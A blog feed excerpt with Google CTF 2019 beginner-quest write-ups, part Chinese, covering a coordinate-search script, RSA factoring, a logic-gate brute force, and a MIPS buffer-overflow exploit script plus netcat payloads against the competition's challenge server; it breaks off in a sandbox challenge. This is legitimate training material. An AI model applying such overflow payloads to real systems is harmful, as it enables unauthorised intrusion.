    <content type="html"><![CDATA[<h2 id="09-Drive-to-the-target-coding"><a href="#09-Drive-to-the-target-coding" class="headerlink" title="09 Drive to the target(coding)"></a>09 Drive to the target(coding)</h2><ul><li><a href="https://drivetothetarget.web.ctfcompetition.com/">https://drivetothetarget.web.ctfcompetition.com/</a></li></ul><pre class="language-txt" data-language="txt"><code class="language-txt">Driving to the targetHurry up, don&#39;t be late for you rendez-vous!Pick your direction51.6498  0.0982  go</code></pre><ul><li>when we change the number, the web will tips :<br>You went 44m at a speed of 21km/h. You are getting away…<br>Woa, were about to move at 126318km/h, this is too fast!<br>…</li><li>the url has 3 parameters:<code>lat</code> <code>lon</code> <code>token</code>,<a href="https://drivetothetarget.web.ctfcompetition.com/?lat=51.6508&amp;lon=3.1001&amp;token=gAAAAABdjLCgmVVSZCgN5-oaDZn9wJnMyNh-EuBXjx1vuSEaMEt4rmB4okyhbOWTOFVo8W4ttBuFX6-7z8A1dqNbzm1XMpVJVDdwj7vQCxPqYYA_Wlrhz_7cbEL61hfMst4nAlYhlNtR">https://drivetothetarget.web.ctfcompetition.com/?lat=51.6508&amp;lon=3.1001&amp;token=gAAAAABdjLCgmVVSZCgN5-oaDZn9wJnMyNh-EuBXjx1vuSEaMEt4rmB4okyhbOWTOFVo8W4ttBuFX6-7z8A1dqNbzm1XMpVJVDdwj7vQCxPqYYA_Wlrhz_7cbEL61hfMst4nAlYhlNtR</a></li><li>in the 2-d maps we should calculate the right directoin lat-lon, and get the flag</li><li>calculate.py</li></ul><pre class="language-py" data-language="py"><code class="language-py">#!&#x2F;usr&#x2F;bin&#x2F;env python3import bs4import requestsimport sysdef get_coordinates(url):    page &#x3D; requests.get(url).content    soup &#x3D; bs4.BeautifulSoup(page, &quot;html.parser&quot;)    cLat &#x3D; float(soup.find(&quot;input&quot;, attrs&#x3D;&#123;&quot;name&quot;: &quot;lat&quot;&#125;)[&quot;value&quot;])    cLon &#x3D; float(soup.find(&quot;input&quot;, attrs&#x3D;&#123;&quot;name&quot;: &quot;lon&quot;&#125;)[&quot;value&quot;])    tken &#x3D; soup.find(&quot;input&quot;, attrs&#x3D;&#123;&quot;name&quot;: &quot;token&quot;&#125;)[&quot;value&quot;]    stat &#x3D; -1 if &quot;away&quot; in soup.text else 0    return [cLat, cLon], tken, statdef main(args):    url &#x3D; &quot;https:&#x2F;&#x2F;drivetothetarget.web.ctfcompetition.com&#x2F;&quot;    if len(args) &#x3D;&#x3D; 0:        pair, token, stat &#x3D; get_coordinates(url)    else:        pair, token, stat &#x3D; get_coordinates(args[0])    done   &#x3D; False    switch &#x3D; False    before &#x3D; None    step &#x3D; 0.0001    while True:        if not switch:            params &#x3D; &quot;?lat&#x3D;%.4f&amp;lon&#x3D;%.4f&amp;token&#x3D;%s&quot; % (pair[0], pair[1] + step, token)        else:            params &#x3D; &quot;?lat&#x3D;%.4f&amp;lon&#x3D;%.4f&amp;token&#x3D;%s&quot; % (pair[0] + step, pair[1], token)        try:            pair, token, stat &#x3D; get_coordinates(url + params)        except:            print(url + params)            quit()        if ( stat &#x3D;&#x3D; -1 and before &#x3D;&#x3D; -1 ):            step *&#x3D; -1        if not switch and ( stat &#x3D;&#x3D; -1 and before &#x3D;&#x3D; 0 ):            switch   &#x3D; True            pair[1] -&#x3D; step        elif switch and ( stat &#x3D;&#x3D; -1 and before &#x3D;&#x3D; 0 ):            print(url + params)            quit()        before &#x3D; stat        print(&quot;%.4f, %.4f&quot; % (pair[0], pair[1]), &quot;: Closer&quot; if not stat else &quot;: Further&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main(sys.argv[1::])</code></pre><pre class="language-sh" data-language="sh"><code class="language-sh">⚡ root@r10  ~&#x2F;google_ctf  python3 calculate.py51.6498, 0.0983 : Further51.6498, 0.0984 : Further51.6498, 0.0983 : Closer51.6498, 0.0982 : Closer51.6498, 0.0981 : Closer...</code></pre><ul><li>finily get </li></ul><pre class="language-txt" data-language="txt"><code class="language-txt">lat&#x3D;51 .4921 , lon&#x3D; -01929Congratulations, you made it, here is the flag: CTF&#123;Who_isardis_Ormandy&#125;</code></pre><ul><li>==<strong>flag:CTF{Who_is_Tardis_Ormandy}</strong>==</li></ul><h2 id="10-Crypto-Caulingo-crypto"><a href="#10-Crypto-Caulingo-crypto" class="headerlink" title="10 Crypto Caulingo(crypto)"></a>10 Crypto Caulingo(crypto)</h2><ul><li>check files information</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;10_crypto_caulingo╰─➤  file *crypto.zip:     Zip archive data, at least v2.0 to extractmsg.txt:        ASCII text, with very long linesproject_dc.pdf: PDF document, version 1.5</code></pre><ul><li>msg.txt</li></ul><pre class="language-txt" data-language="txt"><code class="language-txt">n:17450892350509567071590987572582143158927907441748820483575144211411640241849663641180283816984167447652133133054833591585389505754635416604577584488321462013117163124742030681698693455489404696371546386866372290759608301392572928615767980244699473803730080008332364994345680261823712464595329369719516212105135055607592676087287980208987076052877442747436020751549591608244950255761481664468992126299001817410516694015560044888704699389291971764957871922598761298482950811618390145762835363357354812871474680543182075024126064364949000115542650091904557502192704672930197172086048687333172564520657739528469975770627e:65537msg:50fb0b3f17315f7dfa25378fa0b06c8d955fad0493365669bbaa524688128ee9099ab713a3369a5844bdd99a5db98f333ef55159d3025630c869216889be03120e3a4bd6553d7111c089220086092bcffc5e42f1004f9888f25892a7ca007e8ac6de9463da46f71af4c8a8f806bee92bf79a8121a7a34c3d564ac7f11b224dc090d97fdb427c10867ad177ec35525b513e40bef3b2ba3e6c97cb31d4fe3a6231fdb15643b84a1ce704838d8b99e5b0737e1fd30a9cc51786dcac07dcb9c0161fc754cda5380fdf3147eb4fbe49bc9821a0bcad98d6df9fbdf63cf7d7a5e4f6cbea4b683dfa965d0bd51f792047e393ddd7b7d99931c3ed1d033cebc91968d43f</code></pre><ul><li>check project_dc.pdf, we find <code>RSA</code></li><li>use RSA encryption to get the clear msg. n is very big ,but primes p, q composing the modulus are subject to the following constraint:</li></ul><pre class="language-txt" data-language="txt"><code class="language-txt">|a*p-b*q| &lt; 10000, with 1 &lt;&#x3D; a,b &lt;&#x3D; 1000.&#x3D;&gt;a * p ≈ b * q-&gt; a &#x2F; b * p ≈ q-&gt; a &#x2F; b * p * q ≈ q * q-&gt; a &#x2F; b * N ≈ q^2-&gt; q^2 ≈ N &#x2F; b * a-&gt; q ≈ sqrt(N &#x2F; b * a)</code></pre><ul><li>use bruteforce find a and b, then find q and q (p*q=n)</li><li>solution.py</li></ul><pre class="language-py" data-language="py"><code class="language-py">#!&#x2F;usr&#x2F;bin&#x2F;env python3from Crypto.Util.number import long_to_bytes, bytes_to_longfrom gmpy2 import mpz, isqrt, invert, powmodn &#x3D; mpz(17450892350509567071590987572582143158927907441748820483575144211411640241849663641180283816984167447652133133054833591585389505754635416604577584488321462013117163124742030681698693455489404696371546386866372290759608301392572928615767980244699473803730080008332364994345680261823712464595329369719516212105135055607592676087287980208987076052877442747436020751549591608244950255761481664468992126299001817410516694015560044888704699389291971764957871922598761298482950811618390145762835363357354812871474680543182075024126064364949000115542650091904557502192704672930197172086048687333172564520657739528469975770627)e &#x3D; 65537c &#x3D; bytes_to_long(bytes.fromhex(&#39;50fb0b3f17315f7dfa25378fa0b06c8d955fad0493365669bbaa524688128ee9099ab713a3369a5844bdd99a5db98f333ef55159d3025630c869216889be03120e3a4bd6553d7111c089220086092bcffc5e42f1004f9888f25892a7ca007e8ac6de9463da46f71af4c8a8f806bee92bf79a8121a7a34c3d564ac7f11b224dc090d97fdb427c10867ad177ec35525b513e40bef3b2ba3e6c97cb31d4fe3a6231fdb15643b84a1ce704838d8b99e5b0737e1fd30a9cc51786dcac07dcb9c0161fc754cda5380fdf3147eb4fbe49bc9821a0bcad98d6df9fbdf63cf7d7a5e4f6cbea4b683dfa965d0bd51f792047e393ddd7b7d99931c3ed1d033cebc91968d43f&#39;))def solve_pq(n):    for a in range(1, 1001):        for b in range(a, 1001):            est_q &#x3D; isqrt(n &#x2F;&#x2F; b * a)            for q in range(est_q - 100, est_q + 100):                if n % q &#x3D;&#x3D; 0:                    return n &#x2F;&#x2F; q, qp, q &#x3D; solve_pq(n)phi &#x3D; (p - 1) * (q - 1)d &#x3D; invert(e, phi)msg &#x3D; long_to_bytes(powmod(c, d, n))print(msg.decode(&#39;utf-8&#39;))</code></pre><pre class="language-sh" data-language="sh"><code class="language-sh">⚡ ⚙ root@r10  ~&#x2F;google_ctf  python3 solution.pyHey there!If you are able to decrypt this message, you must a life form with high intelligence!Therefore, we would like to invite you to our dancing party! Here’s your invitation code: CTF&#123;017d72f0b513e89830bccf5a36306ad944085a47&#125;</code></pre><ul><li>==<strong>flag:CTF{017d72f0b513e89830bccf5a36306ad944085a47}</strong>==</li></ul><h2 id="11-Gate-lock-hardware"><a href="#11-Gate-lock-hardware" class="headerlink" title="11 Gate lock(hardware)"></a>11 Gate lock(hardware)</h2><ul><li>unzip the file, and check the information</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;11_gate_lock╰─➤  lltotal 1.4Mdrwxrwxrwx 1 r10 r10 4.0K May 21 06:06 beginner-rwxrwxrwx 1 r10 r10 686K Dec 31  1979 challenge.tgz-rwxrwxrwx 1 r10 r10 686K Jun 23 03:31 gate_lock.zip╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;11_gate_lock╰─➤  cd beginner╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;11_gate_lock&#x2F;beginner╰─➤  lltotal 5.6M-rwxrwxrwx 1 r10 r10  24K May 21 06:06 auth.sqlite-rwxrwxrwx 1 r10 r10  588 May 21 06:06 env_meta.txt-rwxrwxrwx 1 r10 r10    9 May 21 06:06 force_loaded.txt-rwxrwxrwx 1 r10 r10    0 May 21 06:06 ipban.txt-rwxrwxrwx 1 r10 r10 5.6M May 21 06:06 map.sqlite-rwxrwxrwx 1 r10 r10  783 May 21 06:06 map_meta.txt-rwxrwxrwx 1 r10 r10    9 May 21 06:06 mesecon_actionqueue-rwxrwxrwx 1 r10 r10  36K May 21 06:06 players.sqlitedrwxrwxrwx 1 r10 r10 4.0K May 20 22:49 schems-rwxrwxrwx 1 r10 r10  611 May 21 06:19 world.mt╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;11_gate_lock&#x2F;beginner╰─➤  file *auth.sqlite:         SQLite 3.x database, last written using SQLite version 3028000env_meta.txt:        ASCII text, with very long linesforce_loaded.txt:    ASCII text, with no line terminatorsipban.txt:           emptymap.sqlite:          SQLite 3.x database, last written using SQLite version 3028000map_meta.txt:        ASCII textmesecon_actionqueue: ASCII text, with no line terminatorsplayers.sqlite:      SQLite 3.x database, last written using SQLite version 3028000schems:              directoryworld.mt:            ASCII text</code></pre><ul><li>this is a world in game minetest, load the world, show a map of logic gates.</li><li>analyze the map and caiculate </li><li>world.py</li></ul><pre class="language-py" data-language="py"><code class="language-py">from itertools import productdef first_stage(x):    return [        x[2] and not x[3],        x[4] or x[5],        x[14] or x[6],        x[9] and not x[1],        x[20] and not x[18],        x[17] or x[19],        x[7] and not x[6],        x[16] or x[8],        x[10] or not x[2],        x[12] or not x[4],        x[2] or not x[10],        x[5] or not x[13],        x[11] and x[3],        x[13] or not x[5],        x[4] or not x[12],        x[14] and x[6],        x[15] and x[7],        x[15] or x[7],        x[11] or x[3]    ]def second_stage(x):    return [        x[1] and not x[2],        x[3] and x[4],        x[5] and not x[6],        x[7] and not x[8],        x[10] and x[11],        x[12] and not x[13],        x[14] and x[15],        x[16] or x[17],        x[18] and x[19]    ]def third_stage(x,f):    return [        x[1] and x[2],        x[3] and x[4],        x[5] and f[9],        x[6] and x[7],        x[8] or not x[9]    ]def fourth_stage(x):    return [        x[1] and x[2],        x[4] and not x[5]    ]def circuit(arr):    f &#x3D; first_stage(arr)    f &#x3D; [None] + f    s &#x3D; second_stage(f)    s &#x3D; [None] + s    t &#x3D; third_stage(s,f)    t&#x3D; [None] + t    f4 &#x3D; fourth_stage(t)    last &#x3D; f4[0] and (f4[1] and t[3])    return lastdef solution():    for arr in product([True,False],repeat&#x3D;20):        l &#x3D; list(arr)        l &#x3D; [None] + l        if circuit(l):            return arrsol &#x3D; solution()print(&#39;CTF&#123;&#123;&#123;&#125;&#125;&#125;&#39;.format(    &#39;&#39;.join([&#39;1&#39; if sol[i] else &#39;0&#39; for i in range(20)])    ))</code></pre><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;11_gate_lock╰─➤  python3 world.pyCTF&#123;01000010111001000001&#125;</code></pre><ul><li>==<strong>flag:CTF{01000010111001000001}</strong>==</li></ul><h2 id="12-Ad-ad"><a href="#12-Ad-ad" class="headerlink" title="12 Ad(ad)"></a>12 Ad(ad)</h2><ul><li><p><a href="https://www.youtube.com/watch?v=QzFuwljOj8Y">https://www.youtube.com/watch?v=QzFuwljOj8Y</a></p></li><li><p>watch the video, find the flag in the video</p></li><li><p>==<strong>flag:CTF{9e796ca74932912c216a1cd00c25c84fae00e139}</strong>==</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>goolge ctf 2019 stage1 writeup_part_2</title>
    <link href="/2019/10/02/google_ctf_2019_stage1_writeup_2/"/>
    <url>/2019/10/02/google_ctf_2019_stage1_writeup_2/</url>
    
    <content type="html"><![CDATA[<h2 id="05-STOP-GAN-pwn"><a href="#05-STOP-GAN-pwn" class="headerlink" title="05 STOP GAN(pwn)"></a>05 STOP GAN(pwn)</h2><ul><li>提供buffer-overflow.ctfcompetition.com 1337</li><li>下载文件解压得到bof and console.c</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;04_STOP GAN╰─➤  file bof console.cbof:       ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;a31c48679f10dc6945e7b5e3a88b979bebe752e3, not strippedconsole.c: C source, ASCII text</code></pre><ul><li>查看console.c,可以理解此程序可以crash bof 得到1st flag,进一步进行缓冲区溢出可以得到2nd flag</li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token comment">/** * 6e: bufferflow triggering segfault  - binary, compile with: * gcc /tmp/console.c -o /tmp/console -static -s * * Console allows the player to get info on the binary. * Crashing bof will trigger the 1st flag. * Controlling the buffer overflow in bof will trigger the 2nd flag. */</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> inputs<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.\n Bonus flag for controlling the crash.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nConsole commands: \nrun\nquit\n>>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>inputs<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Inputs: %s"</span><span class="token punctuation">,</span> inputs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>inputs<span class="token punctuation">,</span> <span class="token string">"run\n\0"</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/usr/bin/qemu-mipsel-static ./bof"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>inputs<span class="token punctuation">,</span> <span class="token string">"quit\n\0"</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Unable to determine action from your input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ul><li>编译console.c 得到console（由于/usr/bin/qemu-mipsel-static: not found，程序无法正常执行。此问题原因后续研究）</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">➜ 04_STOP GAN gcc console.c -o console -static -s➜ 04_STOP GAN ./consoleYour goal: try to crash the Cauliflower system by providing input to the program <span class="token function">which</span> is launched by using <span class="token string">'run'</span> command. Bonus flag <span class="token keyword">for</span> controlling the crash.Console commands:runquit<span class="token operator">>></span>runInputs: runsh: <span class="token number">1</span>: /usr/bin/qemu-mipsel-static: not foundConsole commands:runquit<span class="token operator">>></span></code></pre><ul><li>利用netcat连接给定的网址，可运行远程console</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">➜ 04_STOP GAN nc -v buffer-overflow.ctfcompetition.com 1337Connection to buffer-overflow.ctfcompetition.com 1337 port [tcp&#x2F;*] succeeded!Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &#39;run&#39; command. Bonus flag for controlling the crash.Console commands:runquit&gt;&gt;runInputs: runaaaaaaaaaaaaaaaaaaaCauliflower systems never crash &gt;&gt;</code></pre><ul><li>由于长度没有达到溢出要求，可以看到随意一串字符串并没有带来crash</li><li>利用python生成长字符串达成crash</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;04_STOP GAN╰─➤   python3 -c &quot;print (&#39;run\n&#39; + &#39;a&#39;*268)&quot; | nc buffer-overflow.ctfcompetition.com 1337Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &#39;run&#39; command. Bonus flag for controlling the crash.Console commands:runquit&gt;&gt;Inputs: runCTF&#123;Why_does_cauliflower_threaten_us&#125;Cauliflower systems never crash &gt;&gt;segfault detected! ***CRASH***Console commands:runquit&gt;&gt;</code></pre><ul><li>==<strong>1st flag:CTF{Why_does_cauliflower_threaten_us}</strong>==</li><li>为了得到2ed flag， need Controlling the buffer overflow in bof</li><li>找到local_flag function(利用IDA逆向工具也可查看到此函数)，地址范围0x400840-0x400890</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;04_STOP GAN╰─➤  nm bof | grep &quot;flag&quot;0049ffc0 D _dl_stack_flags00400840 t local_flag</code></pre><ul><li>当长度为265时,程序爆出提示，说明指针进行了一次跳转</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;04_STOP GAN╰─➤  python3 -c &quot;print (&#39;run\n&#39; + &#39;a&#39;*265)&quot; | nc buffer-overflow.ctfcompetition.com 1337Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &#39;run&#39; command. Bonus flag for controlling the crash.Console commands:runquit&gt;&gt;Inputs: runqemu: uncaught target signal 4 (Illegal instruction) - core dumpedIllegal instruction (core dumped)</code></pre><ul><li>通过实验得到：offset为264字节的填充字符串，加上4字节返回地址，可以将返回指针设定到local_flag函数地址0x400850(对于MIPS的指令调试不熟悉，但buffer-overflow的原理类似，可以参见<a href="https://ctftime.org/writeup/15933%E8%AE%B2%E8%A7%A3)%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8local_flag%E5%9C%B0%E5%9D%80%E8%8C%83%E5%9B%B4%E5%86%85%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">https://ctftime.org/writeup/15933讲解)，可以在local_flag地址范围内一次尝试</a></li><li>编写exlpoit.py</li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        padding <span class="token operator">=</span> <span class="token string">"\x41"</span> <span class="token operator">*</span> <span class="token number">264</span>        address <span class="token operator">=</span> <span class="token string">"\x50\x08\x40"</span>        payload <span class="token operator">=</span> padding <span class="token operator">+</span> address <span class="token operator">+</span> <span class="token string">"\n"</span>        <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> soc<span class="token punctuation">:</span>                soc<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"buffer-overflow.ctfcompetition.com"</span><span class="token punctuation">,</span><span class="token number">1337</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                soc<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                soc<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"run\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                soc<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>soc<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN╰─➤  ./exploit.pyConsole commands:runquit<span class="token operator">>></span>Inputs: runCTF<span class="token punctuation">&#123;</span>controlled_crash_causes_conditional_correspondence<span class="token punctuation">&#125;</span>Cauliflower systems never crash <span class="token operator">>></span>╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/04_STOP GAN╰─➤  python3 -c <span class="token string">"print ('run<span class="token entity" title="\n">\n</span>' + 'a'*264 +'<span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x40">\x40</span>')"</span> <span class="token operator">|</span> <span class="token function">nc</span> buffer-overflow.ctfcompetition.com <span class="token number">1337</span>Your goal: try to crash the Cauliflower system by providing input to the program <span class="token function">which</span> is launched by using <span class="token string">'run'</span> command. Bonus flag <span class="token keyword">for</span> controlling the crash.Console commands:runquit<span class="token operator">>></span>Inputs: runCTF<span class="token punctuation">&#123;</span>controlled_crash_causes_conditional_correspondence<span class="token punctuation">&#125;</span>Cauliflower systems never crash <span class="token operator">>></span></code></pre><ul><li>==<strong>2nd flag:CTF{controlled_crash_causes_conditional_correspondence}</strong>==</li></ul><h2 id="06-Work-Computer-sandbox"><a href="#06-Work-Computer-sandbox" class="headerlink" title="06 Work Computer(sandbox)"></a>06 Work Computer(sandbox)</h2><ul><li>netcat connect :readme.ctfcompetition.com 1337</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;05_Work╰─➤  nc readme.ctfcompetition.com 1337&gt; ls -altotal 12drwxrwxrwt    2 0        0               80 Sep 20 14:05 .drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..----------    1 1338     1338            33 Sep 20 14:05 ORME.flag-r--------    1 1338     1338            28 Sep 20 14:05 README.flag&gt; cat README.flagerror: No such file or directory&gt; more README.flagerror: No such file or directory&gt; vim README.flagerror: No such file or directory&gt;</code></pre><ul><li>发现命令均失效，查看/bin /sbin /usr/bin /usr/sbin,大部分命令均被busybox限制</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">&gt; busyboxbusybox can not be called for alien reasons.</code></pre><pre class="language-txt" data-language="txt"><code class="language-txt">[H[J**********************************************ALIEN SHELL**********************************************USER is: @(null)[H[J&gt; total 808drwxr-xr-x    2 65534    65534         4096 Jun 13 14:28 .drwxr-xr-x   20 0        0             4096 Jun 13 14:28 ..lrwxrwxrwx    1 65534    65534           12 May  9 20:49 arch -&gt; &#x2F;bin&#x2F;busybox-rwxr-xr-x    1 65534    65534       796240 Jan 24  2019 busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 chgrp -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 chown -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 conspy -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 date -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 df -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 dmesg -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 dnsdomainname -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 dumpkmap -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 echo -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 false -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 fdflush -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 65534    65534           12 May  9 20:49 fsync -&gt; &#x2F;bin&#x2F;busyboxlrwxrwxrwx    1 